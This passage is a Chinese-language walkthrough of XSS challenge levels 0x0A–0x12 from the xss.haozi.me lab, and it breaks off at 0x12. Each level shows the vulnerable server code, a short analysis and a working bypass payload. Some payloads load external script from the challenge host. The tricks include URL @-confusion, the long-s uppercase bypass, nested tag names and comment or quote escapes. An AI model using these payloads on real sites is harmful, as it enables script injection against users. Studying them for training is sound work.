class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> (<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escapeHtml</span>(<span class=\"params\">s</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s.replace(<span class=\"regexp\">/&amp;/g</span>, <span class=\"string\">'&amp;amp;'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/'/g</span>, <span class=\"string\">'&amp;#39;'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/\"/g</span>, <span class=\"string\">'&amp;quot;'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/&lt;/g</span>, <span class=\"string\">'&amp;lt;'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/&gt;/g</span>, <span class=\"string\">'&amp;gt;'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/\\//g</span>, <span class=\"string\">'&amp;#x2f'</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">const</span> domainRe = <span class=\"regexp\">/^https?:\\/\\/www\\.segmentfault\\.com/</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (domainRe.test(input)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">`&lt;script src=\"<span class=\"subst\">$&#123;escapeHtml(input)&#125;</span>\"&gt;&lt;/script&gt;`</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">'Invalid URL'</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-10\"><a href=\"#分析-10\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">用正则表达式匹配'https(http)://www.segmentfault.com',用html实体替换<span class=\"meta\">&amp;'\"&lt;&gt;\\。</span></span><br><span class=\"line\"><span class=\"number\">1</span>.利用url中的@引用js</span><br><span class=\"line\"><span class=\"number\">2</span>.直接在给定的网址https:<span class=\"comment\">//www.segmentfault.com 注册账号，新建一个笔记，内容为alert(1)，再调用这个笔记链接即可，需要换行</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-10\"><a href=\"#input-code-10\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span> <span class=\"string\">https:</span><span class=\"comment\">//www.segmentfault.com@xss.haozi.me/j.js</span></span><br><span class=\"line\"><span class=\"number\">2.</span> <span class=\"string\">https:</span><span class=\"comment\">//www.segmentfault.com/n/</span></span><br><span class=\"line\"><span class=\"number\">1330000016631643</span>/raw （这一行换行）</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-10\"><a href=\"#html-10\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight livescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span> &lt;script src=<span class=\"string\">\"https:&amp;<span class=\"subst\">#x2f</span>&amp;<span class=\"subst\">#x2fwww</span>.segmentfault.com@xss.haozi.me&amp;<span class=\"subst\">#x2fj</span>.js\"</span>&gt;&lt;/script&gt;</span><br><span class=\"line\"><span class=\"number\">2.</span> &lt;script src=<span class=\"string\">\"https:&amp;<span class=\"subst\">#x2f</span>&amp;<span class=\"subst\">#x2fwww</span>.segmentfault.com&amp;<span class=\"subst\">#x2fn</span>&amp;<span class=\"subst\">#x2f</span></span></span><br><span class=\"line\"><span class=\"string\">1330000016631643&amp;<span class=\"subst\">#x2fraw</span>\"</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/00A.png\" alt=\"00A\"></p>\n<h1 id=\"0x0B\"><a href=\"#0x0B\" class=\"headerlink\" title=\"0x0B\"></a>0x0B</h1><h2 id=\"server-code-11\"><a href=\"#server-code-11\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> <span class=\"params\">(input)</span></span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">input</span> = <span class=\"built_in\">input</span>.toUpperCase()</span><br><span class=\"line\">  <span class=\"keyword\">return</span> `&lt;h1&gt;$&#123;<span class=\"built_in\">input</span>&#125;&lt;/h1&gt;`</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-11\"><a href=\"#分析-11\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">将输入的数据用toUpperCase进行了大写转换。可以利用<span class=\"selector-tag\">html</span> 标签, 域名 不区分大小写的方式来攻克。</span><br><span class=\"line\"><span class=\"number\">1</span>.引用外部链接解决</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-11\"><a href=\"#input-code-11\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://xss.haozi.me/j.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-11\"><a href=\"#html-11\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">SCRIPT</span> <span class=\"attr\">SRC</span>=<span class=\"string\">\"HTTPS://XSS.HAOZI.ME/J.JS\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">SCRIPT</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/00B.png\" alt=\"00B\"></p>\n<h1 id=\"0x0C\"><a href=\"#0x0C\" class=\"headerlink\" title=\"0x0C\"></a>0x0C</h1><h2 id=\"server-code-12\"><a href=\"#server-code-12\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function render (input) &#123;</span><br><span class=\"line\">  <span class=\"selector-tag\">input</span> = <span class=\"selector-tag\">input</span>.replace(/script/ig, <span class=\"string\">''</span>)</span><br><span class=\"line\">  <span class=\"selector-tag\">input</span> = <span class=\"selector-tag\">input</span>.toUpperCase()</span><br><span class=\"line\">  return <span class=\"string\">'&lt;h1&gt;'</span> + <span class=\"selector-tag\">input</span> + <span class=\"string\">'&lt;/h1&gt;'</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-12\"><a href=\"#分析-12\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">首先将<span class=\"keyword\">script</span>不论大小写用空替换,并将输入的数据用toUpperCase进行了大写转换。绕过<span class=\"keyword\">script</span>过滤后利用html 标签, 域名 不区分大小写的方式来攻克。</span><br><span class=\"line\"><span class=\"number\">1.</span>引用外部链接解决</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-12\"><a href=\"#input-code-12\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"tag\">&lt;<span class=\"name\">scscriptript</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://xss.haozi.me/j.js\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">scscriptript</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-12\"><a href=\"#html-12\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">SCRIPT</span> <span class=\"attr\">SRC</span>=<span class=\"string\">\"HTTPS://XSS.HAOZI.ME/J.JS\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">SCRIPT</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/00C.png\" alt=\"00C\"></p>\n<h1 id=\"0x0D\"><a href=\"#0x0D\" class=\"headerlink\" title=\"0x0D\"></a>0x0D</h1><h2 id=\"server-code-13\"><a href=\"#server-code-13\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> (<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">  input = input.replace(<span class=\"regexp\">/[&lt;/\"']/g</span>, <span class=\"string\">''</span>)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">    &lt;script&gt;</span></span><br><span class=\"line\"><span class=\"string\">          // alert('<span class=\"subst\">$&#123;input&#125;</span>')</span></span><br><span class=\"line\"><span class=\"string\">    &lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\">  `</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-13\"><a href=\"#分析-13\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight livescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤了&lt;<span class=\"regexp\">/\"',并用/</span>/单行注释,但是可以换行绕过过滤,使用html注释<span class=\"function\">--&gt;</span>来注释后面的js，使代码正常运行。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-13\"><a href=\"#input-code-13\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>.</span><br><span class=\"line\"><span class=\"comment\">//这一行换行</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">alert</span><span class=\"params\">(`<span class=\"number\">1</span>`)</span></span></span><br><span class=\"line\">--&gt;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-13\"><a href=\"#html-13\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"actionscript\">          <span class=\"comment\">// alert('</span></span></span><br><span class=\"line\"><span class=\"javascript\">alert(<span class=\"string\">`1`</span>)</span></span><br><span class=\"line\"><span class=\"undefined\">--&gt;')</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/00D.png\" alt=\"00D\"></p>\n<h1 id=\"0x0E\"><a href=\"#0x0E\" class=\"headerlink\" title=\"0x0E\"></a>0x0E</h1><h2 id=\"server-code-14\"><a href=\"#server-code-14\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function render (input) &#123;</span><br><span class=\"line\">  <span class=\"selector-tag\">input</span> = <span class=\"selector-tag\">input</span>.replace(/&lt;([a-zA-Z])/g, <span class=\"string\">'&lt;_$1'</span>)</span><br><span class=\"line\">  <span class=\"selector-tag\">input</span> = <span class=\"selector-tag\">input</span>.toUpperCase()</span><br><span class=\"line\">  return <span class=\"string\">'&lt;h1&gt;'</span> + <span class=\"selector-tag\">input</span> + <span class=\"string\">'&lt;/h1&gt;'</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-14\"><a href=\"#分析-14\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight xquery\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">将&lt;后的第一个字符变成了<span class=\"number\">_</span>字符,导致<span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">变成</span></span><span class=\"xml\"><span class=\"handlebars\"><span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">_script</span>&gt;</span>,有个特殊ſ 字符,是古英语中的s的写法, 转成大写是正常的S。</span></span></span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-14\"><a href=\"#input-code-14\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.<span class=\"tag\">&lt;<span class=\"name\">ſcript</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://xss.haozi.me/j.js\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-14\"><a href=\"#html-14\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">SCRIPT</span> <span class=\"attr\">SRC</span>=<span class=\"string\">\"HTTPS://XSS.HAOZI.ME/J.JS\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">SCRIPT</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/00E.png\" alt=\"00E\"></p>\n<h1 id=\"0x0F\"><a href=\"#0x0F\" class=\"headerlink\" title=\"0x0F\"></a>0x0F</h1><h2 id=\"server-code-15\"><a href=\"#server-code-15\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> (<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escapeHtml</span>(<span class=\"params\">s</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s.replace(<span class=\"regexp\">/&amp;/g</span>, <span class=\"string\">'&amp;amp;'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/'/g</span>, <span class=\"string\">'&amp;#39;'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/\"/g</span>, <span class=\"string\">'&amp;quot;'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/&lt;/g</span>, <span class=\"string\">'&amp;lt;'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/&gt;/g</span>, <span class=\"string\">'&amp;gt;'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/\\//g</span>, <span class=\"string\">'&amp;#x2f;'</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">`&lt;img src onerror=\"console.error('<span class=\"subst\">$&#123;escapeHtml(input)&#125;</span>')\"&gt;`</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-15\"><a href=\"#分析-15\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">对<span class=\"selector-tag\">html</span> inline js 转义就是做无用功，浏览器会先解析<span class=\"selector-tag\">html</span>, 然后再解析 js。构造闭合就行。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-15\"><a href=\"#input-code-15\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>');alert('<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-15\"><a href=\"#html-15\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. &lt;img src <span class=\"attribute\">onerror</span>=<span class=\"string\">\"console.error('&amp;#39;);alert(&amp;#39;1')\"</span>&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/00F.png\" alt=\"00F\"></p>\n<h1 id=\"0x10\"><a href=\"#0x10\" class=\"headerlink\" title=\"0x10\"></a>0x10</h1><h2 id=\"server-code-16\"><a href=\"#server-code-16\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> (<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">&lt;script&gt;</span></span><br><span class=\"line\"><span class=\"string\">  window.data = <span class=\"subst\">$&#123;input&#125;</span></span></span><br><span class=\"line\"><span class=\"string\">&lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\">  `</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-16\"><a href=\"#分析-16\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight gcode\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">用；拆分加上alert<span class=\"comment\">(1)</span>就行。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-16\"><a href=\"#input-code-16\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span> <span class=\"number\">123</span>;alert(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-16\"><a href=\"#html-16\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.  </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"built_in\">window</span>.data = <span class=\"number\">123</span>;alert(<span class=\"number\">1</span>)</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/010.png\" alt=\"010\"></p>\n<h1 id=\"0x11\"><a href=\"#0x11\" class=\"headerlink\" title=\"0x11\"></a>0x11</h1><h2 id=\"server-code-17\"><a href=\"#server-code-17\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// from alf.nu</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> (<span class=\"params\">s</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escapeJs</span> (<span class=\"params\">s</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">String</span>(s)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/\\\\/g</span>, <span class=\"string\">'\\\\\\\\'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/'/g</span>, <span class=\"string\">'\\\\\\''</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/\"/g</span>, <span class=\"string\">'\\\\\"'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/`/g</span>, <span class=\"string\">'\\\\`'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/&lt;/g</span>, <span class=\"string\">'\\\\74'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/&gt;/g</span>, <span class=\"string\">'\\\\76'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/\\//g</span>, <span class=\"string\">'\\\\/'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/\\n/g</span>, <span class=\"string\">'\\\\n'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/\\r/g</span>, <span class=\"string\">'\\\\r'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/\\t/g</span>, <span class=\"string\">'\\\\t'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/\\f/g</span>, <span class=\"string\">'\\\\f'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/\\v/g</span>, <span class=\"string\">'\\\\v'</span>)</span><br><span class=\"line\">            <span class=\"comment\">// .replace(/\\b/g, '\\\\b')</span></span><br><span class=\"line\">            .replace(<span class=\"regexp\">/\\0/g</span>, <span class=\"string\">'\\\\0'</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  s = escapeJs(s)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">&lt;script&gt;</span></span><br><span class=\"line\"><span class=\"string\">  var url = 'javascript:console.log(\"<span class=\"subst\">$&#123;s&#125;</span>\")'</span></span><br><span class=\"line\"><span class=\"string\">  var a = document.createElement('a')</span></span><br><span class=\"line\"><span class=\"string\">  a.href = url</span></span><br><span class=\"line\"><span class=\"string\">  document.body.appendChild(a)</span></span><br><span class=\"line\"><span class=\"string\">  a.click()</span></span><br><span class=\"line\"><span class=\"string\">&lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\">`</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-17\"><a href=\"#分析-17\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">将\"替代<span class=\"symbol\">\\\"</span>,构造闭合绕过,这里的坑是它替代的<span class=\"symbol\">\\需</span>要手动加一个、</span><br><span class=\"line\">因为\" 被转义成 <span class=\"symbol\">\\\"</span> 经过html 解析后 console.log(\"<span class=\"symbol\">\\\"</span>)会报语法错误, 再补个 <span class=\"symbol\">\\ </span>即可</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-17\"><a href=\"#input-code-17\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span> <span class=\"string\">\"),alert(\"</span><span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-17\"><a href=\"#html-17\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>.  </span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">  <span class=\"selector-tag\">var</span> url = <span class=\"string\">'javascript:console.log(\"\\\"),alert(\\\"1\")'</span></span><br><span class=\"line\">  <span class=\"selector-tag\">var</span> <span class=\"selector-tag\">a</span> = document.createElement(<span class=\"string\">'a'</span>)</span><br><span class=\"line\">  <span class=\"selector-tag\">a</span><span class=\"selector-class\">.href</span> = url</span><br><span class=\"line\">  document<span class=\"selector-class\">.body</span><span class=\"selector-class\">.appendChild</span>(a)</span><br><span class=\"line\">  <span class=\"selector-tag\">a</span>.click()</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/011.png\" alt=\"011\"></p>\n<h1 id=\"0x12\"><a href=\"#0x12\" class=\"headerlink\" title=\"0x12\"></a>0x12</h1><h2 id=\"server-code-18\"><a href=\"#server-code-18\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight scilab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// from alf.nu</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span> <span class=\"params\">(s)</span> &#123;</span></span><br><span class=\"line\">  s = s.replace(/<span class=\"string\">\"/g, '</span>\\\\<span class=\"string\">\"'</span>)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">'&lt;script&gt;console.log(\"</span><span class=\"string\">' + s + '</span><span class=\"string\">\");&lt;/script&gt;'</span></span><br><span 